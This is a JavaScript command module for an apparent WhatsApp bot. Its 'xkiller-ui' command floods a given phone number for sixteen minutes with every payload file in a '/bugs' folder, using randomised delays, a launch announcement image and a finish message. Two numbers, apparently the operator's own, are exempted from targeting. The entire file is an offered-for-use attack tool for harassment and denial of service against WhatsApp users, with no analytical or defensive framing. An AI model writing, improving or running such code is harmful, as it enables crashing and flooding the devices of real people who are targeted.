const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'xkiller-ui',
  desc: 'Bug flood using all payloads from /bugs for 16 minutes',
  category: 'bug',
  react: '💥',
  filename: __filename
}, async (bot, mek, { arg, from, reply }) => {
  try {
    const targetNumber = arg?.replace(/\D/g, '');
    if (!targetNumber || targetNumber.length < 8) {
      return await reply(`❌ Usage:\n.xkiller-ui <number>\nEx: .xkiller-ui 50942241547`);
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;

    // 🛡️ Pwoteksyon kont tèt ou ak admin
    const protectedNumbers = [
      '13058962443@s.whatsapp.net',
      '50942241547@s.whatsapp.net'
    ];
    if (protectedNumbers.includes(targetJid) || targetJid === mek.sender) {
      return await reply('🛡️ This number is protected. Command aborted.');
    }

    const bugsDir = path.join(__dirname, '../all/bugs');
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await reply('📁 No payloads found in /bugs folder.');
    }

    // ✅ Voye imaj avan atak la
    const imagePath = path.join(__dirname, '../all/media/5.png');
    if (fs.existsSync(imagePath)) {
      const imageBuffer = fs.readFileSync(imagePath);
      await bot.sendMessage(from, {
        image: imageBuffer,
        caption: `🚨 *xkiller-ui launched on* wa.me/${targetNumber}\n🕒 *Duration:* 16min\n⚡ *Delay:* 300–700ms\n📦 *Payloads:* ${bugFiles.length}`,
      }, { quoted: mek });
    }

    const endTime = Date.now() + 16 * 60 * 1000; // 16 minit

    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        try {
          const payloadPath = path.join(bugsDir, file);
          let bugPayload = require(payloadPath);

          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const msg = bugPayload.default;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'string') {
            const msg = bugPayload;
            bugPayload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof bugPayload === 'function') {
            await bugPayload(bot, targetNumber);
          }

        } catch (e) {
          console.error(`❌ Error in ${file}:`, e.message);
        }

        // ✅ Delay random ant chak payload
        await new Promise(res => setTimeout(res, 300 + Math.floor(Math.random() * 400))); // 300–700ms
      }

      // ⏱ Delay ant chak sik payload
      await new Promise(res => setTimeout(res, 1000));
    }

    await bot.sendMessage(from, {
      text: `✅ *xkiller-ui attack finished on* +${targetNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    await reply(`❌ Error: ${err.message}`);
  }
});
